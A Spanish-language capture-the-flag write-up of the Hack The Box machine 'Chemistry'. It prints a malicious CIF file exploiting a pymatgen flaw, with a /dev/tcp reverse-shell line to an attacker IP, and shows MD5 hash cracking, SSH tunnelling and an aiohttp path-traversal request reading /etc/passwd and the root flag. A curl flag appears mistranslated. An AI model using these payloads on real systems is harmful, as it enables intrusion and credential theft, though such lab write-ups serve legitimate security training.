---
layout: single
title: Chemistry - Easy
excerpt: "Hola a todos, hoy les presentaré la resolución de una máquina **Hack the box de dificultad Easy**. En esta máquina aprenderemos a subir un archivo **CIF malicioso** para luego acceder al sistema i a continuacion acceder por **SSH** con un usuario y llegar a ser **root** abusando de **LFI** "

date: 2024-11-24
classes: wide
header:
  teaser: /assets/images/2024-11-24-chemistry-easy/Chemistry.png
  teaser_home_page: true

categories:
  - Hack the box 
  - Pentesting
  - CTF
tags:  
  - CIF Malicioso
  - LFI
  - Hack the box 

---

![](/assets/images/2024-11-24-chemistry-easy/C)

Hola a todos, hoy les presentaré la resolución de una máquina de **Hack The Box de dificultad fácil**. En esta máquina aprenderemos a subir un archivo **CIF malicioso** para luego acceder al sistema y, a continuación, acceder por **SSH** con un usuario y llegar a ser root abusando de **LFI**.
<br>

# Reconocimiento
- Enumeración con nmap
    
    Hacemos un `nmap` simple para ver los puertos que corren en la máquina
    
    ```python
    # Nmap nmap -p- -sS --min-rate 5000 -T5 -Pn -vvv -oN ports.txt 10.10.11.38
    Increasing send delay for 10.10.11.38 from 0 to 5 due to 1525 out of 3812 dropped probes since last increase.
    Warning: 10.10.11.38 giving up on port because retransmission cap hit (2).
    Nmap scan report for 10.10.11.38
    Host is up, received user-set (0.31s latency).
    Scanned at 2024-11-24 13:59:18 CET for 34s
    Not shown: 65124 closed tcp ports (reset), 409 filtered tcp ports (no-response)
    PORT     STATE SERVICE REASON
    22/tcp   open  ssh     syn-ack ttl 63
    5000/tcp open  upnp    syn-ack ttl 63

    Read data files from: /usr/bin/../share/nmap
    ```
    
    Una vez tenemos los puertos que en este caso como podemos ver es el `22(ssh)` y el `5000(upnp)` 
    
    aplicamos un `nmap` más exhaustivo a dichos puertos
    
    ```python
    # Nmap nmap -p22,5000 -sC -v -T5 -oN porttinfo.txt 10.10.11.38
    Nmap scan report for 10.10.11.38
    Host is up (0.36s latency).

    PORT     STATE SERVICE
    22/tcp   open  ssh
    | ssh-hostkey: 
    |   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
    |   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
    |_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
    5000/tcp open  upnp

    Read data files from: /usr/bin/../share/nmap
    ```
  ## Ahora accederemos a la web para poder determinar que clase de vulnerabilidades que podemos encontrar
        
    Si escribimos en el navegador **http://10.10.11.38:5000/** nos encontraremos con esta sección.    
    ![Untitled](/assets/images/2024-11-24-chemistry-easy/Login.png)
    
    Vamos a probar a registrarnos para ver qué encontramos.    

    ![Untitled](/assets/images/2024-11-24-chemistry-easy/Registrar.png)
    
    Una vez registrados, vemos que podemos subir archivos, pero si le damos a **here**, se nos descargará un archivo **.cif**
    
    ![Untitled](/assets/images/2024-11-24-chemistry-easy/Upload.png)

    Investigando un poco descubrimos que podemos subir un archivo **CIF malicioso**

  # Explotación del `CIF MALICIOS`
    
    Nos copiaremos el <a href="https://github.com/9carlo6/CVE-2024-23346">código</a>.    


    ```python
        data_Example
        _cell_length_a    10.00000
        _cell_length_b    10.00000
        _cell_length_c    10.00000
        _cell_angle_alpha 90.00000
        _cell_angle_beta  90.00000
        _cell_angle_gamma 90.00000
        _symmetry_space_group_name_H-M 'P 1'
        loop_
        _atom_site_label
        _atom_site_fract_x
        _atom_site_fract_y
        _atom_site_fract_z
        _atom_site_occupancy
        
        H 0.00000 0.00000 0.00000 1
        O 0.50000 0.50000 0.50000 1
        _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.10.10/4444 0>&1\'");0,0,0'

        _space_group_magn.number_BNS  62.448
        _space_group_magn.name_BNS  "P  n'  m  a'  "

    ```
    Lo que hace este código es aplicar una reverse shell abriendo una conexión TCP a la IP que hayamos puesto en el puerto 4444 para obtener acceso a la máquina víctima.    
    
    Una vez entendido lo que hace el código, nos ponemos en escucha.    

    ```python
    nc -nlvp 4444
    listening on [any] 4444 ...
    ```    
  # Acceso a la máquina
    
    Ya hemos obtenido acceso y podemos observar que somos el usuario `app`
    
    ```python
    nc -nlvp 4444                                          
    listening on [any] 4444 ...
    connect to [10.10.16.17] from (UNKNOWN) [10.10.11.38] 38484
    sh: 0: can't access tty; job control turned off
    $ whoami
    app
    $ script /dev/null -c bash
    Script started, file is /dev/null
    app@chemistry:~$ 
    ```     
    Investigando un poco, encontramos esta ruta bastante interesante: **/home/app/instance**, 
    
    la cual tiene un archivo **database.db.** Si lo miramos, encontramos diferentes **hashes** de varios usuarios que podemos intentar romper con John.

    ```python

    john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  

    Using default input encoding: UTF-8
    Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Press 'q' or Ctrl-C to abort, almost any other key for status
    ********** (?)     
    1g 0:00:00:00 DONE (2024-11-24 17:38) 1.162g/s 16678Kp/s 16678Kc/s 36823KC/s  fuckyooh21..*7¡Vamos!
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed. 

    ```

    Una vez que tenemos la contraseña del usuario Rosa, podemos intentar acceder por SSH.    
   
    ```python
      ssh rosa@10.10.11.38
      rosa@10.10.11.38's password: 
      Permission denied, please try again.
      rosa@10.10.11.38's password: 
      Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

      * Documentation:  https://help.ubuntu.com
      * Management:     https://landscape.canonical.com
      * Support:        https://ubuntu.com/pro

      System information as of Sun 24 Nov 2024 10:14:54 PM UTC

        System load:           0.0
        Usage of /:            73.9% of 5.08GB
        Memory usage:          33%
        Swap usage:            0%
        Processes:             222
        Users logged in:       0
        IPv4 address for eth0: 10.10.11.38
        IPv6 address for eth0: dead:beef::250:56ff:feb9:2fc5


      Expanded Security Maintenance for Applications is not enabled.

      0 updates can be applied immediately.

      9 additional security updates can be applied with ESM Apps.
      Learn more about enabling ESM Apps service at https://ubuntu.com/esm


      The list of available updates is more than a week old.
      To check for new updates run: sudo apt update
      Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

      rosa@chemistry:~$ 

    ```
  
    Y si aplicamos un `ls` vemos el `user.txt(la flag)`

    ```bash
      rosa@chemistry:~$ pwd
      /home/rosa
      rosa@chemistry:~$ ls
      root  user.txt
      rosa@chemistry:~$ 
    ```
     
  # Escalada a `root`
    
    Investigando, podemos encontrar que hay puertos internos abiertos pero el que más nos llama la antención es el **127.0.0.1:8080**
    
    ```python
      netstat  -nltp
      (Not all processes could be identified, non-owned process info
      will not be shown, you would have to be root to see it all.)
      Active Internet connections (only servers)
      Proto Recv-Q Send-Q Local Address           Foreign Address         State  >
      tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN >
      tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN >
      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN >
      tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN >
      tcp6       0      0 :::22                   :::*                    LISTEN >
      rosa@chemistry:/home/app$ 
    ```
    Podemos intentar hacer **port forwarding** para acceder a dicho puerto.     

    ```python 
        ssh -L 4445:127.0.0.1:8080 rosa@10.10.11.38 -fN
    ```
    *este comando establece un túnel SSH que permite acceder a un servicio que se ejecuta en el puerto 8080 del servidor remoto a través del puerto 4445 de tu máquina local, ejecutándose en segundo plano sin abrir una sesión interactiva en el servidor remoto.*
    <br><br>

    Una vez hecho esto, podremos acceder a la web **http://127.0.0.1:4445**.
    
    ![Untitled](/assets/images/2024-11-24-chemistry-easy/portforwarding.png)

    Pero, investigando un poco, no vemos nada interesante, así que podemos probar a usar curl en el usuario rosa para ver si encontramos algo que nos pueda servir.

    ```java 
    curl http://localhost:8080 --head
    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 5971
    Date: Sun, 24 Nov 2024 18:39:59 GMT
    Server: Python/3.9 aiohttp/3.9.1
    ```
    Vemos que la versión del servidor es **aiohttp/3.9.1.**

    Investigando un poco en internet, encontramos que es vulnerable a <a href="https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0
    ">LFI</a>. Si aplicamos el comando en el usuario Rosa, podemos observar la vulnerabilidad.

    ```python
    curl -s --ruta- as-is http://localhost:8080/assets/../../../../etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    app:x:1001:1001:,,,:/home/app:/bin/bash
    _laurel:x:997:997::/var/log/laurel:/bin/false

    ```
    Si podemos visualizar el etc/passwd tambine podriamos visualizar la **flag** del root
    
    ```python 
    curl -s --ruta- as-is http://localhost:8080/assets/../../../../root/root.txt
    ```

  # Finalización 
    Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta **CTF**. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.
